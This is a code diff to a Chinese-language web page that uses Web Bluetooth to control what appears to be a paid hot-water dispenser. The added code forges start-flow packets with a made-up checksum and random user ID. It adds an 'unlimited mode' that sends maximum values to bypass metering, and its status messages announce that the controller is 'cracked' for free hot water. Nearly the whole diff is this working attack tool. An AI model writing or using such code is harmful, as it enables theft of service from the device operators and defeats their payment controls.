@@ -137,6 +137,37 @@
         onclick="try{window.startWaterController && window.startWaterController(); console.log('✅HTML内联点击成功');}catch(e){console.error('❌HTML内联失败:',e);}"
         data-onclick="startWaterController"
         style="pointer-events: auto !important; cursor: pointer !important;">开启</button>
+      
+      <!-- 🚰 水量控制面板 -->
+      <div id="water-controls" style="display: none; margin: 20px 0; padding: 20px; background: rgba(255,255,255,0.1); border-radius: 15px; backdrop-filter: blur(10px);">
+        <h3 style="color: #fff; margin: 0 0 15px 0; font-size: 18px;">💧 水量控制</h3>
+        
+        <div style="margin-bottom: 15px;">
+          <label style="color: rgba(255,255,255,0.9); font-size: 14px; display: block; margin-bottom: 5px;">设置出水量 (毫升):</label>
+          <input type="number" id="water-amount" value="500" min="1" max="65000" style="width: 100px; padding: 5px; border-radius: 5px; border: none; text-align: center;" />
+          <button onclick="setWaterAmount()" style="margin-left: 10px; padding: 5px 15px; background: linear-gradient(45deg, #4CAF50, #45a049); color: white; border: none; border-radius: 5px; font-size: 12px;">设置</button>
+        </div>
+        
+        <div style="display: flex; gap: 10px; flex-wrap: wrap; justify-content: center;">
+          <button onclick="quickWaterAmount(100)" style="padding: 8px 12px; background: linear-gradient(45deg, #2196F3, #1976D2); color: white; border: none; border-radius: 8px; font-size: 12px; cursor: pointer;">100ml</button>
+          <button onclick="quickWaterAmount(500)" style="padding: 8px 12px; background: linear-gradient(45deg, #2196F3, #1976D2); color: white; border: none; border-radius: 8px; font-size: 12px; cursor: pointer;">500ml</button>
+          <button onclick="quickWaterAmount(1000)" style="padding: 8px 12px; background: linear-gradient(45deg, #2196F3, #1976D2); color: white; border: none; border-radius: 8px; font-size: 12px; cursor: pointer;">1L</button>
+          <button onclick="quickWaterAmount(2000)" style="padding: 8px 12px; background: linear-gradient(45deg, #2196F3, #1976D2); color: white; border: none; border-radius: 8px; font-size: 12px; cursor: pointer;">2L</button>
+        </div>
+        
+        <div style="margin: 15px 0;">
+          <button onclick="activateUnlimitedMode()" style="width: 100%; padding: 12px; background: linear-gradient(45deg, #FF9800, #F57C00); color: white; border: none; border-radius: 10px; font-size: 14px; font-weight: bold; cursor: pointer;">♾️ 激活无限模式</button>
+        </div>
+        
+        <div style="margin-top: 15px;">
+          <button onclick="emergencyStop()" style="width: 100%; padding: 12px; background: linear-gradient(45deg, #f44336, #d32f2f); color: white; border: none; border-radius: 10px; font-size: 14px; font-weight: bold; cursor: pointer;">🛑 紧急停止</button>
+        </div>
+        
+        <div id="water-status" style="margin-top: 15px; padding: 10px; background: rgba(0,0,0,0.2); border-radius: 8px; color: rgba(255,255,255,0.9); font-size: 13px; text-align: center;">
+          💧 状态: 待机中
+        </div>
+      </div>
+      
       <button 
         id="clear-pairing-button" 
         style="background: linear-gradient(45deg, #ff6b6b, #ee5a6f) !important; font-size: 14px !important; padding: 8px 20px !important; pointer-events: auto !important; cursor: pointer !important;" 
@@ -535,6 +566,12 @@
                       isStarted = true;
                       updateUi("ok");
                       console.log("🎉 水控器启动成功！");
+                      
+                      // 🚰 发送初始启动指令，开始控制水流
+                      setTimeout(() => {
+                        sendWaterControl('start_flow');
+                        updateWaterStatus("🎉 水控器已破解，可以免费使用！");
+                      }, 1000);
                     } catch (err) {
                       console.error("启动确认失败:", err);
                       handleBluetoothError(err);
@@ -622,11 +659,190 @@
           }
         }
         
+        // 水量控制功能
+        let currentWaterAmount = 0; // 当前累计出水量(毫升)
+        let isWaterFlowing = false; // 水是否在流动
+        let waterFlowInterval = null; // 水流计时器
+        
+        // 发送水量控制指令
+        async function sendWaterControl(action, amount = 0) {
+          if (!txdCharacteristic) return;
+          
+          try {
+            let controlPacket;
+            
+            switch (action) {
+              case 'start_flow':
+                // 🚰 启动出水指令 (参考原项目的startEpilogue)
+                const deviceName = bluetoothDevice.name || "WaterController";
+                const checksum = calculateCRC16(deviceName.slice(-5));
+                const randomId = [Math.floor(Math.random() * 256), Math.floor(Math.random() * 256)];
+                const datetime = getCurrentDateTimeArray();
+                
+                controlPacket = new Uint8Array([
+                  ...detectedProtocol.header,  // 0xfd, 0xfd
+                  0x09, 0xb2, 0x01,           // 启动指令
+                  checksum & 0xFF, checksum >> 8, 0x0b, 0x00,  // 校验和和标志位
+                  ...randomId,                 // 随机用户ID
+                  ...datetime,                 // 当前时间
+                  0x0f, 0x27, 0x00           // 固定尾部
+                ]);
+                
+                console.log("🚰 发送启动出水指令:", Array.from(controlPacket).map(b => '0x' + b.toString(16).padStart(2, '0')).join(' '));
+                break;
+                
+              case 'set_amount':
+                // 💧 设置出水量指令 (amount为毫升)
+                const amountHigh = (amount >> 8) & 0xFF;
+                const amountLow = amount & 0xFF;
+                
+                controlPacket = new Uint8Array([
+                  ...detectedProtocol.header,  // 0xfd, 0xfd
+                  0x09, 0xc5,                  // 水量设置指令
+                  amountHigh, amountLow,       // 水量(毫升)
+                  0x01, 0x00, 0x00, 0x00      // 控制标志
+                ]);
+                
+                console.log(`💧 设置出水量 ${amount}ml:`, Array.from(controlPacket).map(b => '0x' + b.toString(16).padStart(2, '0')).join(' '));
+                break;
+                
+              case 'stop_flow':
+                // 🛑 停止出水指令
+                controlPacket = new Uint8Array([
+                  ...detectedProtocol.header,  // 0xfd, 0xfd
+                  0x09, 0xb3, 0x00, 0x00      // 停止指令
+                ]);
+                
+                console.log("🛑 发送停止出水指令:", Array.from(controlPacket).map(b => '0x' + b.toString(16).padStart(2, '0')).join(' '));
+                break;
+                
+              case 'unlimited_mode':
+                // ♾️ 无限模式 - 发送超大数值绕过限制
+                controlPacket = new Uint8Array([
+                  ...detectedProtocol.header,  // 0xfd, 0xfd
+                  0x09, 0xc5,                  // 水量设置指令  
+                  0xFF, 0xFF,                  // 最大水量 (65535ml)
+                  0xFF, 0xFF, 0xFF, 0xFF      // 特殊控制标志
+                ]);
+                
+                console.log("♾️ 激活无限出水模式:", Array.from(controlPacket).map(b => '0x' + b.toString(16).padStart(2, '0')).join(' '));
+                break;
+            }
+            
+            if (controlPacket) {
+              await txdCharacteristic.writeValue(controlPacket);
+            }
+          } catch (error) {
+            console.error(`水量控制错误 (${action}):`, error);
+            handleBluetoothError(error);
+          }
+        }
+        
+        // 简化的CRC16计算 (模拟原项目算法)
+        function calculateCRC16(str) {
+          let crc = 0;
+          for (let i = 0; i < str.length; i++) {
+            crc = ((crc << 8) ^ str.charCodeAt(i)) & 0xFFFF;
+            for (let j = 0; j < 8; j++) {
+              if (crc & 0x8000) {
+                crc = ((crc << 1) ^ 0x1021) & 0xFFFF;
+              } else {
+                crc = (crc << 1) & 0xFFFF;
+              }
+            }
+          }
+          return crc;
+        }
+        
+        // 获取当前时间数组 (格式：年月日时分秒)
+        function getCurrentDateTimeArray() {
+          const now = new Date();
+          return [
+            now.getFullYear() % 100,  // 年 (后两位)
+            now.getMonth() + 1,       // 月
+            now.getDate(),            // 日  
+            now.getHours(),           // 时
+            now.getMinutes(),         // 分
+            now.getSeconds()          // 秒
+          ];
+        }
+        
         // 主要的按钮处理函数
         function handleButtonClick() {
           console.log("🚀 handleButtonClick被调用，当前状态:", isStarted);
-          isStarted ? endBluetooth() : startBluetooth();
+          if (isStarted) {
+            endBluetooth();
+          } else {
+            startBluetooth();
+          }
         }
+        
+        // 水量控制UI函数
+        function updateWaterStatus(status) {
+          const statusEl = document.getElementById("water-status");
+          if (statusEl) {
+            statusEl.textContent = status;
+          }
+        }
+        
+        function showWaterControls() {
+          const controlsEl = document.getElementById("water-controls");
+          if (controlsEl) {
+            controlsEl.style.display = "block";
+            updateWaterStatus("💧 状态: 已连接，可以控制水量");
+          }
+        }
+        
+        function hideWaterControls() {
+          const controlsEl = document.getElementById("water-controls");
+          if (controlsEl) {
+            controlsEl.style.display = "none";
+          }
+        }
+        
+        // 水量控制全局函数
+        window.setWaterAmount = function() {
+          const amountInput = document.getElementById("water-amount");
+          const amount = parseInt(amountInput.value);
+          
+          if (amount <= 0 || amount > 65000) {
+            alert("请输入1-65000之间的水量值");
+            return;
+          }
+          
+          updateWaterStatus(`💧 状态: 设置出水量 ${amount}ml`);
+          sendWaterControl('set_amount', amount);
+        };
+        
+        window.quickWaterAmount = function(amount) {
+          document.getElementById("water-amount").value = amount;
+          updateWaterStatus(`💧 状态: 快速设置 ${amount}ml`);
+          sendWaterControl('set_amount', amount);
+        };
+        
+        window.activateUnlimitedMode = function() {
+          if (confirm("⚠️ 确定要激活无限出水模式吗？这将绕过所有水量限制！")) {
+            updateWaterStatus("♾️ 状态: 无限模式已激活 - 免费热水");
+            sendWaterControl('unlimited_mode');
+          }
+        };
+        
+        window.emergencyStop = function() {
+          updateWaterStatus("🛑 状态: 紧急停止");
+          sendWaterControl('stop_flow');
+        };
+        
+        // 修改updateUi函数以显示/隐藏水量控制
+        const originalUpdateUi = updateUi;
+        updateUi = function(state) {
+          originalUpdateUi(state);
+          
+          if (state === "ok") {
+            showWaterControls();
+          } else {
+            hideWaterControls();
+          }
+        };
         
         // 🔥 全局暴露函数
         window.startWaterController = handleButtonClick;
